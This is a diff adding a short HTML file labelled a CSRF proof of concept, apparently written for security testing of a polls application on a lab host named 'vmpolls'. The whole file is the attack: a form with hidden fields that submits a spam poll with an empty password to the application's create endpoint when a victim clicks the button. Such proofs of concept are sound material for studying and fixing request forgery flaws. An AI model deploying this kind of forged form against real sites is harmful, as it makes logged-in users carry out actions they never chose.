@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="http://vmpolls:9000/polls/create/">
+			<input type="hidden" name="title" value="spamtitle">
+			<input type="hidden" name="description" value="spam">
+			<input type="hidden" name="password" value="">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
+</html>
